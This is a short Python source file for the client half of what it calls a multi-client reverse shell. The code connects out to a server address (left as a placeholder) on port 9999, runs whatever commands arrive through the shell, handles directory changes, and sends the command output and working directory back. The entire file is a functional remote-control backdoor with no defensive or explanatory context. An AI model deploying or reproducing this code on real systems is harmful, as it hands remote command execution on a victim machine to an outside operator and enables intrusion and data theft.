import socket
import os
import subprocess

# multi-client reverse shell

# create socket

sock = socket.socket()
host = "ip_of_server_or_host_running_Server.py"
port = 9999

# connect to server

sock.connect((host,port))

# sending data to the server as per the request

while True:

    try:
        data_recv = sock.recv(1024)
        if data_recv[:2].decode("utf-8")=="cd":
            os.chdir(data_recv[3:].decode("utf-8"))
        if len(data_recv)>0:
            inp_command = subprocess.Popen(data_recv[:].decode("utf-8"),shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            out_data = str(inp_command.stdout.read() + inp_command.stderr.read(),"utf-8")
            sock.send(str.encode(out_data+ os.getcwd()+">"))

    except socket.error as msg:
        print("CLIENT: Socket Error: "+str(msg))

